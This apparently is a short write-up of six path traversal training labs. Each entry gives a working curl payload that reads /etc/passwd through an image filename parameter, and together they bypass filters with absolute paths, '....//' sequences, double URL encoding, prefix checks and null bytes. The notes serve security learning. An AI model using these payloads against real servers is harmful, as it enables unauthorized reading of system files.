1. This lab has a file path traversal vulnerability in the image loading. As such, `/etc/passwd` can be retrieved by running `curl https://ace41fbb1f868312c0be4eb8003a0071.web-security-academy.net/image?filename=../../../../etc/passwd`
2. This lab is the same as above, but blocks `../`. However using absolute file paths work, so the following command works `curl https://aca21f691eaa485cc01a52ae00340075.web-security-academy.net/image?filename=/etc/passwd`
3. This lab has the same vulnerability, but strips out any `../` sequences non-recursively. However, a sequence such as `....//` will result in `../` after the middle `../` is stripped, resulting in a valid payload. The exploit is as follows: `curl https://acdc1fc71fc63e47c0cd4473000a001f.web-security-academy.net/image?filename=....//....//....//etc/passwd`
4. This lab is the same, but blocks any `../`, including when URL encoded. It then URL decodes the resulting string and uses it. That allows for a nested URL encode to bypass the filter, creating the following payload `curl https://ac681f4c1eeab07fc0d0378200ca00c5.web-security-academy.net/image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`. Notably, `%25` is the URL encoding of `%`, so a sequence such as `%252e` will become `%2e` after the first decode, which becomes `.` after the second
5. This lab has the entire path be transmitted within the HTTP request and the server validates that the path starts with `/var/www/images`. However, `../` is not blocked, so directory traversal is still possible with a payload such as `curl https://ac8e1faf1e996ceec0da45dd00970017.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd`
6. This lab verifies that the requested file ends in a valid image file extension. However, the library used for loading the file uses null byte terminated strings, so the server is vulnerable to null byte injection. As such, the following payload works: `curl https://ac0a1f841e1c20e1c011629f00e50040.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg`